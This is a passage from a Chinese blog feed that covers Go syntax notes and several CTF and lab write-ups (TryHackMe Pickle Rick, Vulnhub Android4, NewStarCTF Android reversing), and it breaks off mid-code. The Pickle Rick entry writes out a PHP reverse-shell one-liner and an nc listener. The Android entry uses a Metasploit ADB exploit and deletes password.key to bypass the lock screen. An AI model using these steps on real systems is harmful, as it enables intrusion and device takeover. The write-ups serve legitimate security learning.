语言中没有选择将<code>~</code>作为取反运算符，而是复用了<code>^</code>符号，当两个数字使用<code>^</code>时，例如<code>a^b</code>，它就是异或运算符，只对一个数字使用时，例如<code>^a</code>，那么它就是取反运算符。go 也支持增强赋值运算符</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span> += <span class="hljs-number">1</span><br><span class="hljs-attribute">a</span> /= <span class="hljs-number">2</span><br><span class="hljs-attribute">a</span> &amp;^= <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p><strong>注意</strong>：go 中没有自增和自减，他们变成了语句 <code>statement</code> ，并且规定了只能位于操作数的后方，所以不用再去纠结 <code>i++</code>和<code>++i</code> 这种不太聪明的问题，但是没有返回值。甚至  <code>a = b++</code> 这种写法是错误的。</p><h1 id="字面量"><a href="#字面量" class="headerlink" title="字面量"></a>字面量</h1><h2 id="整型字面量"><a href="#整型字面量" class="headerlink" title="整型字面量"></a>整型字面量</h2><p>允许使用 <code>_</code> 进行数字划分，但是仅仅允许在前缀符号之后和数字之间使用</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">24 </span>// <span class="hljs-number">24</span><br><span class="hljs-symbol">024 </span>// <span class="hljs-number">24</span><br><span class="hljs-number">2</span>_4 // <span class="hljs-number">24</span><br><span class="hljs-number">0</span>_2_4 // <span class="hljs-number">24</span><br><span class="hljs-number">10</span>_000 // <span class="hljs-number">10</span>k<br><span class="hljs-number">100</span>_000 // <span class="hljs-number">100</span>k<br><span class="hljs-number">0</span>O24 // <span class="hljs-number">20</span><br><span class="hljs-number">0</span>b00 // <span class="hljs-number">0</span><br><span class="hljs-number">0</span>x00 // <span class="hljs-number">0</span><br><span class="hljs-number">0</span>x0_0 // <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h2 id="浮点型字面量"><a href="#浮点型字面量" class="headerlink" title="浮点型字面量"></a>浮点型字面量</h2><p>通过不同前缀可以表达不同进制浮点数</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">0.<br>72.40<br>072.40       <span class="hljs-string">//</span> == 72.40<br>2.71828<br>1.e+0<br>6.67428e-11<br>1E6<br><span class="hljs-string">.25</span><br><span class="hljs-string">.12345E</span>+5<br>1_5.         <span class="hljs-string">//</span> == 15.0<br>0.15e+0_2    <span class="hljs-string">//</span> == 15.0<br><br>0x1p-2       <span class="hljs-string">//</span> == 0.25<br>0x2.p10      <span class="hljs-string">//</span> == 2048.0<br>0x1.Fp+0     <span class="hljs-string">//</span> == 1.9375<br>0X.8p-0      <span class="hljs-string">//</span> == 0.5<br>0X_1FFFP-16  <span class="hljs-string">//</span> == 0.1249847412109375<br>0x15e-2      <span class="hljs-string">//</span> == 0x15e - 2 <span class="hljs-params">(integer subtraction)</span><br></code></pre></td></tr></table></figure><h2 id="复数字面量"><a href="#复数字面量" class="headerlink" title="复数字面量"></a>复数字面量</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">0i<br>0123i         <span class="hljs-string">//</span> == 123i<br>0o123i        <span class="hljs-string">//</span> == 0o123 * 1i == 83i<br>0xabci        <span class="hljs-string">//</span> == 0xabc * 1i == 2748i<br>0.i<br>2.71828i<br>1.e+0i<br>6.67428e-11i<br>1E6i<br><span class="hljs-string">.25i</span><br><span class="hljs-string">.12345E</span>+5i<br>0x1p-2i       <span class="hljs-string">//</span> == 0x1p-2 * 1i == 0.25i<br></code></pre></td></tr></table></figure><h2 id="字符字面量"><a href="#字符字面量" class="headerlink" title="字符字面量"></a>字符字面量</h2><p>字符字面量必须使用单引号括起来 <code>&#39;&#39;</code></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#x27;a&#x27;<br>&#x27;ä&#x27;<br>&#x27;你&#x27;<br>&#x27;\t&#x27;<br>&#x27;\007&#x27;<br>&#x27;\x07&#x27;<br>&#x27;\xff&#x27;<br>&#x27;\u12e4&#x27;<br>&#x27;\U<span class="hljs-number">00101234</span>&#x27;<br></code></pre></td></tr></table></figure><h2 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h2><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\a</span>   U+<span class="hljs-number">0007</span> 响铃符号<br><span class="hljs-string">\b</span>   U+<span class="hljs-number">0008</span> 回退符号<br><span class="hljs-string">\f</span>   U+<span class="hljs-number">000</span>C 换页符号<br><span class="hljs-string">\n</span>   U+<span class="hljs-number">000</span>A 换行符号<br><span class="hljs-string">\r</span>   U+<span class="hljs-number">000</span>D 回车符号<br><span class="hljs-string">\t</span>   U+<span class="hljs-number">0009</span> 横向制表符号<br><span class="hljs-string">\v</span>   U+<span class="hljs-number">000</span>B 纵向制表符号<br><span class="hljs-string">\\</span>   U+<span class="hljs-number">005</span>C 反斜杠转义<br><span class="hljs-string">\&#x27;</span>   U+<span class="hljs-number">0027</span> 单引号转义 (该转义仅在字符内有效)<br><span class="hljs-string">\&quot;</span>   U+<span class="hljs-number">0022</span> 双引号转义 (该转义仅在字符串内有效)<br></code></pre></td></tr></table></figure><h2 id="字符串字面量"><a href="#字符串字面量" class="headerlink" title="字符串字面量"></a>字符串字面量</h2><p>字符串字面量必须使用双引号 <code>&quot;&quot;</code> 括起来或者反引号（反引号字符串不允许转义）</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs swift">`abc`                <span class="hljs-comment">// &quot;abc&quot;</span><br>`\n<br>\n`                  <span class="hljs-comment">// &quot;\\n\n\\n&quot;</span><br><span class="hljs-string">&quot;<span class="hljs-subst">\n</span>&quot;</span><br><span class="hljs-string">&quot;<span class="hljs-subst">\&quot;</span>&quot;</span>                 <span class="hljs-comment">// `&quot;`</span><br><span class="hljs-string">&quot;kfcvme50!<span class="hljs-subst">\n</span>&quot;</span><br><span class="hljs-string">&quot;疯狂星期四v我50&quot;</span><br><span class="hljs-string">&quot;\u65e5本\U00008a9e&quot;</span><br><span class="hljs-string">&quot;\xff\u00FF&quot;</span><br></code></pre></td></tr></table></figure><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><p>通过 <code>func</code> 关键字来进行</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">func</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>fmt.Println(<span class="hljs-number">1</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>参数类型后置</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs fortran">func Hello(<span class="hljs-keyword">name</span> string) &#123;<br>  <span class="hljs-keyword">fmt</span>.Println(<span class="hljs-keyword">name</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>多返回值</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">func</span> <span class="hljs-title function_">Pos</span><span class="hljs-params">()</span> <span class="hljs-params">()</span> <span class="hljs-params">(x, y float64)</span> &#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="代码风格"><a href="#代码风格" class="headerlink" title="代码风格"></a>代码风格</h1><h2 id="花括号换行"><a href="#花括号换行" class="headerlink" title="花括号换行"></a>花括号换行</h2><p>go 中花括号都不能换行</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-comment">//正确</span><br><span class="hljs-function">func <span class="hljs-title">main</span>()</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;Hello butt3rf1y!&quot;</span>)<br>&#125;<br><br><span class="hljs-comment">//错误</span><br><span class="hljs-function">func <span class="hljs-title">main</span>()</span> <br>&#123;<br>fmt.Println(<span class="hljs-string">&quot;Hello butt3rf1y!&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="代码缩进"><a href="#代码缩进" class="headerlink" title="代码缩进"></a>代码缩进</h2><p>go 中代码间隔也有一定的意义，比如说</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>*<span class="hljs-number">4</span> + <span class="hljs-number">5</span>/<span class="hljs-number">1</span>*<span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>在格式化后，<code>*</code> 符号之间的间隔会显得更紧凑，意味着优先进行运算，而 <code>+</code> 符号附近的间隔则较大，代表着较后进行运算。</p><h2 id="省略"><a href="#省略" class="headerlink" title="省略"></a>省略</h2><p>在 go 中的 if 和 for 语句可以只写一行，但必须加上花括号</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css">func <span class="hljs-selector-tag">main</span>() &#123;<br>for <span class="hljs-selector-tag">i</span> := <span class="hljs-number">0</span>; <span class="hljs-selector-tag">i</span> &lt; <span class="hljs-number">10</span>; <span class="hljs-selector-tag">i</span>++ &#123;<br>fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-selector-tag">i</span>)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="三元表达式"><a href="#三元表达式" class="headerlink" title="三元表达式"></a>三元表达式</h2><p>go 中没有三元表达式，不能写像 c 语言中的 <code>temp = (a &gt; b) ? a : b;</code>  这种表达式。</p>]]></content>
    
    
    <categories>
      
      <category>语言</category>
      
      <category>Go</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>THM-Pickle Rick</title>
    <link href="/2025/01/15/Rick/"/>
    <url>/2025/01/15/Rick/</url>
    
    <content type="html"><![CDATA[<p>时隔一个半月，我终于活了！</p><span id="more"></span><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -T4 -sS -Pn <span class="hljs-number">10.10.85.211</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/cd3fd564cb250a1f.png"></p><p>开放了 <code>22/tcp ssh服务</code>  和 <code>80/tcp http服务</code> </p><p>访问一下网页 <code>10.10.85.211:80</code>，好像并没有什么有用信息</p><p><img src="https://img.dkdun.cn/v1/2025/12/fcd52b11d2a9dc4f.png"></p><p>emmm…f12 一下，发现了 <code>Username：R1ckRul3s</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/8e199542379a914d.png"></p><h2 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h2><p>然后再扫一下目录吧</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">dirsearch <span class="hljs-punctuation">-</span>u http<span class="hljs-punctuation">:</span><span class="hljs-comment">//10.10.85.211/</span><br></code></pre></td></tr></table></figure><p>扫到了几个看起来挺有用的目录，一个一个访问一下</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[01:23:50]</span> <span class="hljs-number">301</span> -  <span class="hljs-number">313</span>B  - /assets  -&gt;  http:<span class="hljs-comment">//10.10.85.211/assets/</span><br><span class="hljs-selector-attr">[01:23:50]</span> <span class="hljs-number">200</span> -  <span class="hljs-number">588</span>B  - /assets/<br><span class="hljs-selector-attr">[01:24:39]</span> <span class="hljs-number">200</span> -  <span class="hljs-number">455</span>B  - /login<span class="hljs-selector-class">.php</span><br><span class="hljs-selector-attr">[01:25:10]</span> <span class="hljs-number">200</span> -   <span class="hljs-number">17</span>B  - /robots.txt<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/6c25fc2caf1164eb.png"></p><p>首先是 <code>robots.txt</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/5238ec11e7dc36f5.png"></p><p>一串字符串，不知道有没有用但也先收集着</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">Wubbalubbadubdub</span><br></code></pre></td></tr></table></figure><p>访问一下 <code>login.php</code>，用户名和密码，把之前发现的 <code>R1ckRul3s</code> 和那串奇怪的字符串填进去，发现成功了</p><p><img src="https://img.dkdun.cn/v1/2025/12/c568a7a5f6d0b782.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/16fb5a5e82e320f8.png"></p><h1 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h1><p>在 <code>Command Panel</code> 执行 <code>ls</code>，得到了如下结果，一堆目录和文件</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Sup3rS3cretPickl3Ingred<span class="hljs-selector-class">.txt</span><br>assets<br>clue<span class="hljs-selector-class">.txt</span><br>denied<span class="hljs-selector-class">.php</span><br>index<span class="hljs-selector-class">.html</span><br>login<span class="hljs-selector-class">.php</span><br>portal<span class="hljs-selector-class">.php</span><br>robots.txt<br></code></pre></td></tr></table></figure><p>cat 不行但是 tac 可以，输入 tac 可以</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">tac</span> Sup3rS3cretPickl3Ingred.txt<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/a40d69c3151dda0c.png"></p><p>得到了第一个 flag</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">mr. meeseek hair<br></code></pre></td></tr></table></figure><h1 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h1><p>之前 <code>ls</code> 显示出来的文件中有一个名为 <code>clue.txt</code> 的文件，中文意思是 “线索”，查看一下</p><p><img src="https://img.dkdun.cn/v1/2025/12/18ee2ed196878302.png"></p><p>意思是 “在文件系统中寻找其他成分。” </p><p>看来得在系统中寻找，那来反弹 shell 一下</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">php -r &#x27;<span class="hljs-variable">$sock</span>=fsockopen(<span class="hljs-string">&quot;10.21.118.213&quot;</span>,<span class="hljs-number">6667</span>);<span class="hljs-variable">$proc</span>=proc_open(<span class="hljs-string">&quot;/bin/sh -i&quot;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-number">0</span>=&gt;<span class="hljs-variable">$sock</span>, <span class="hljs-number">1</span>=&gt;<span class="hljs-variable">$sock</span>, <span class="hljs-number">2</span>=&gt;<span class="hljs-variable">$sock</span>),<span class="hljs-variable">$pipes</span>);&#x27;<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -l -p <span class="hljs-number">6667</span><br></code></pre></td></tr></table></figure><p>这里有一个小插曲，因为我用的 wsl，反弹 shell 的时候在 wsl 的 kali 上监听了很多次，但是都没有回显，搞了好几个小时，最后终于破防，在凌晨三点求助于 n0o0b 师傅，师傅让我在 Windows 本机上进行 nc 监听，对了！这次成了，终于！特别特别感谢 n0o0b 师傅 zwz！！！</p><p><img src="https://img.dkdun.cn/v1/2025/12/c358e20f23b37553.png"></p><p>然后根据自己的流程找出第二个 flag</p><p><img src="https://img.dkdun.cn/v1/2025/12/80331b77365a4f56.png"></p><p>第二个 flag</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">jerry tear</span><br></code></pre></td></tr></table></figure><h1 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h1><p>本来我想着拿到 shell 了，进 root 看看，但是忘记开始看的时候好像是 www-data 权限，权限不够</p><p><img src="https://img.dkdun.cn/v1/2025/12/fc4fa2fcbbe0bad6.png"></p><p>那试试 <code>sudo -l</code> 列出目前用户可执行与无法执行的指令，发现可以通过 sudo 免密码使用 root（狂喜）</p><p>直接使用 <code>sudo su</code> 进入</p><p><img src="https://img.dkdun.cn/v1/2025/12/66849ce6212ea5d3.png"></p><p>第三个 flag</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">fleeb juice</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
      <category>靶机</category>
      
      <category>THM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>THM 渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vulnhub-Android4:1</title>
    <link href="/2024/11/30/Vulnhub-Android4-1/"/>
    <url>/2024/11/30/Vulnhub-Android4-1/</url>
    
    <content type="html"><![CDATA[<p>通过查找资料，又学习到了一些东西，我心甚慰，喜欢这样的自己 ：）</p><span id="more"></span><p>初学者</p><p>攻击机 kali：192.168.88.138</p><p>靶机：192.168.88.140</p><p><img src="https://img.dkdun.cn/v1/2024/12/01aaf50efc271d05.png"></p><p>扫描网段，发现主机 192.168.88.140</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sS <span class="hljs-number">192.168.88.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2024/12/b114f4a2a3bd2d98.png"></p><p>查看开放端口</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">nmap -<span class="hljs-selector-tag">A</span> -sV -<span class="hljs-selector-tag">p</span>- <span class="hljs-number">192.168</span>.<span class="hljs-number">88.140</span><br></code></pre></td></tr></table></figure><p>可以看到目标开放了 3 个端口，分别是 5555、8080、22000，先看看 8080 吧</p><p><img src="https://img.dkdun.cn/v1/2024/12/c8b2c3645dec92a9.png"></p><p>页面提示说有后门，用 POST 方式提交</p><p><img src="https://img.dkdun.cn/v1/2024/12/533c79a56b1a35bb.png"></p><p>用 dirb 扫描一下目录，扫出来了 <code>backdoor.php</code> </p><p><img src="https://img.dkdun.cn/v1/2024/12/48095127f1dcb6bc.png"></p><p>看来是个假的后门，没用。。。</p><p><img src="https://img.dkdun.cn/v1/2024/12/a03c6db318dad930.png"></p><p>PHP CLI 和 DropBear 也没什么结果，那么看看 5555 端口，搜了一下是指 android 服务默认的监听端口，通常与一些设备管理和远程访问服务相关联，特别是 adb 服务默认使用这个端口</p><p>简单介绍一下 adb：Android Debug Bridge（安卓调试桥），它就是一个命令行工具，用于通过电脑端与模拟器或者是设备之间的交互。</p><p>用 msf 来搜索一下 adb 漏洞，找到一个远程命令执行漏洞</p><p><img src="https://img.dkdun.cn/v1/2024/12/921633b6f851291e.png"></p><p>调用模块，然后进行利用</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">use</span> exploit/android/adb/adb_server_exec<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> RHOSTS 192.168.88.138 （目标IP）<br><span class="hljs-built_in">set</span> LHOST 192.168.88.140 （本机IP）<br><span class="hljs-built_in">run</span> <br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2024/12/52fb8adc6fe57576.png"></p><p>adb 连接，直接 getshell</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">adb</span> <span class="hljs-number">192.168.88.140</span><br>adb shell<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2024/12/2f0c334bc0eefed1.png"></p><p>但是是普通权限，那么直接 <code>su</code> 进入 root 权限</p><p><img src="https://img.dkdun.cn/v1/2024/12/12e806c87ee042bd.png"></p><p>列出当前路径下的文件，访问 <code>data</code> 目录（Android 中重要的存储数据的目录，存储着用户的所有程序相关数据），发现有 root，进入得到 flag</p><p><img src="https://img.dkdun.cn/v1/2024/12/a11f4b548e67a0b2.png"></p><p>得到</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">flag:</span> ANDROID&#123;u_GOT_root_buddy&#125;<br></code></pre></td></tr></table></figure><p>来都来了，尝试着破解一下密码，进入</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell">/<span class="hljs-class"><span class="hljs-keyword">data</span>/system/</span><br></code></pre></td></tr></table></figure><p>发现了 <code>password.key</code> </p><p><img src="https://img.dkdun.cn/v1/2024/12/f844809cb8685583.png"></p><p>使用最朴素的破解办法，那就是 —- 直接给他删了（嘻嘻）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> password.key<br></code></pre></td></tr></table></figure><p>删除之后打开靶机界面，直接 enter 就解锁了</p><p><img src="https://img.dkdun.cn/v1/2024/12/b192013003c50db4.png"></p><p>通过查找资料，又学习到了一些东西，我心甚慰，喜欢这样的自己 ：）</p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
      <category>靶机</category>
      
      <category>Vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NewStarCTF 2024 Week3</title>
    <link href="/2024/11/29/Week3/"/>
    <url>/2024/11/29/Week3/</url>
    
    <content type="html"><![CDATA[<p>不行，我好菜啊TT</p><p>更一下，自由支配的时间好少（</p><p>时隔半个多月，我终于小有时间更新了！！！</p><span id="more"></span><h1 id="simpleAndroid"><a href="#simpleAndroid" class="headerlink" title="simpleAndroid"></a>simpleAndroid</h1><p>按照老方法看 <code>.xml</code> 里 的 <code>activity</code> 内容找主函数</p><p>经过 <code>CheckRoot.check()</code> 判断后将正确结果返回，然后跳转到 <code>CheckActivity</code> </p><p><img src="https://img.dkdun.cn/v1/2024/12/71863c1f53ad4f50.png"></p><p>用 <code>isValidInput()</code> 来输入的格式进行检测，长度必须为 24 ，形式以 <code>flag&#123;</code> 开头 <code>&#125;</code> 结尾，然后通过 <code>CheckData</code> 来进行比较</p><p>可以看到一个熟悉的 <code>native</code>，说明这个方法属于 <code>native</code> 层，需要去逆 <code>so</code> 文件了</p><p><img src="https://img.dkdun.cn/v1/2024/12/514232c5e71d14b0.png"></p><p>看了下 wp 居然可以直接改后缀为 <code>.zip</code> 找 <code>so</code> 文件！！！那所有 apk 文件都可以吗？！下次遇到试试这样走捷径(bushi)</p><p>搜索 <code>CheckData</code> 函数</p><p><img src="https://img.dkdun.cn/v1/2024/12/ec471833977c7734.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">  Class = _JNIEnv::FindClass(a1, <span class="hljs-string">&quot;com/example/simpleandroid/UseLess&quot;</span>);<br><span class="hljs-comment">//寻找 Java 的 UseLess 类</span><br>  StaticFieldID = _JNIEnv::GetStaticFieldID(a1, Class, <span class="hljs-string">&quot;CHAR_DATA&quot;</span>, <span class="hljs-string">&quot;Ljava/lang/String;&quot;</span>);<br><span class="hljs-comment">//通过 GetStaticFieldID 获取到了字段 CHAR_DATA 的 jfileID </span><br>  v27 = _JNIEnv::NewStringUTF(a1, <span class="hljs-string">&quot;BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/A&quot;</span>);<br><span class="hljs-comment">//创建的新的 jString 类型字符串</span><br>  _JNIEnv::SetStaticObjectField(a1, Class, StaticFieldID, v27);<br><span class="hljs-comment">//通过 SetStaticObjectField 把 v27 赋值给 Java 的 CHAR_DATA 字段</span><br><span class="hljs-comment">//修改了 Java 层的 UseLess 的 CHAR_DATA 字段</span><br><br>  StaticMethodID = _JNIEnv::GetStaticMethodID(a1, Class, <span class="hljs-string">&quot;func&quot;</span>, <span class="hljs-string">&quot;(Ljava/lang/String;)Ljava/lang/String;&quot;</span>);<br><span class="hljs-comment">//获取 Java 层函数 func 的 jmethodID </span><br>  v9 = <span class="hljs-number">0</span>;<br>  v25 = _JNIEnv::CallStaticObjectMethod((_DWORD)a1, Class, StaticMethodID, v30, v3, v4, v7[<span class="hljs-number">0</span>]);<br><span class="hljs-comment">//通过 CallStaticObjectMethod 将输入的 v30 传入 func 函数 </span><br>  StringUTFChars = _JNIEnv::GetStringUTFChars(a1, v25, <span class="hljs-number">0LL</span>);<br><span class="hljs-comment">//将上面函数调用的返回值赋给了 StringUTFChars</span><br><span class="hljs-comment">//把输入作为参数传给了 Java 层的 func 函数，得到返回值</span><br></code></pre></td></tr></table></figure><p>回到 jad-gui 看 <code>UseLess</code> 类，流程可以看出来进行 Base64 的变换，因为 <code>so</code> 对于 <code>CHAR_DATA</code> 进行了更改，所以这里是一个换表的 Base64</p><p><img src="https://img.dkdun.cn/v1/2024/12/f4fb59bd9b159a1a.png"></p><p>输入首先经过换表 Base64 的变化，进入 <code>so</code> 加密。首先前后交换位置，再进行循环右移 4 位的操作，最后和<code>data_1</code> 进行比较。</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs 